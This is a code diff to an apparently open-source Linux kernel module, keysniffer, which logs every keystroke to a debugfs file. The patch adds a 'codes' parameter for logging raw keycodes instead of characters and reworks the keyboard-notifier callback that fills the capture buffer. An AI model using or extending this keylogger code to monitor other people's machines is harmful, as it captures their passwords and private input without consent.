@@ -21,15 +21,20 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/keyboard.h>
 #include <linux/debugfs.h>
 
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 
+static int codes=0;
+
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_VERSION("1.4");
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
+module_param(codes, int, 0644);
+MODULE_PARM_DESC(codes, "Flag: 0: US keyboard, 1: keycodes (base10)");
 
 /* Declarations */
 static struct dentry *file;
@@ -151,38 +156,46 @@ int keysniffer_cb(struct notifier_block *nblock,
 		return NOTIFY_OK;
 
 	if (param->value >= 0x1 && param->value <= 0x77) {
-                pressed_key = param->shift
-                    ? us_keymap[param->value][1]
-                    : us_keymap[param->value][0];
-		if (pressed_key) {
-                        int pklen, replen;
-                        to_base_n_string(param->value,10,key,sizeof(int)+1);
-                        to_base_n_string(param->shift,10,rep,sizeof(int)+1);
-                        pressed_key = key;
+              pressed_key = param->shift
+                ? us_keymap[param->value][1]
+                : us_keymap[param->value][0];
+              if (pressed_key) {
+                int pklen, replen;
+                if ( codes ){
+                    to_base_n_string(param->value,10,key,sizeof(int)+1);
+                    to_base_n_string(param->shift,10,rep,sizeof(int)+1);
+                    pressed_key = key;
+                    pklen = strlen(pressed_key);
+                    replen = strlen(rep);
                         
-                        pklen = strlen(pressed_key);
-                        replen = strlen(rep);
-                        
-                        len = pklen + replen + 1;
+                    len = pklen + replen + 1;
+                }
+                else {
+                    len = strlen(pressed_key);
+                }
                   
-			if ((buf_pos + len) >= BUF_LEN) {
-				memset(keys_buf, 0, BUF_LEN);
-				buf_pos = 0;
-			}
+                if ((buf_pos + len) >= BUF_LEN) {
+                    memset(keys_buf, 0, BUF_LEN);
+                    buf_pos = 0;
+                }
+                if( codes )
+                {
+                    strncpy(keys_buf + buf_pos, rep, replen);
+                    buf_pos += replen;
+                    strncpy(keys_buf + buf_pos, " ", 1);
+                    buf_pos++;
+                    strncpy(keys_buf + buf_pos, pressed_key,
+                        pklen);
+                    buf_pos += pklen;
+                }
+                else{
+                    strncpy(keys_buf + buf_pos, pressed_key,len);
+                    buf_pos += len;
+                }
+                keys_buf[buf_pos++] = '\n';
 
-                        strncpy(keys_buf + buf_pos, rep, replen);
-                        buf_pos += replen;
-                        strncpy(keys_buf + buf_pos, " ", 1);
-                        buf_pos++;
-			strncpy(keys_buf + buf_pos, pressed_key,
-                                pklen);
-                        buf_pos += pklen;
-
-
-			keys_buf[buf_pos++] = '\n';
-
-			pr_debug("%s\n", pressed_key);
-		}
+                pr_debug("%s\n", pressed_key);
+              }
 	}
 
 	return NOTIFY_OK;
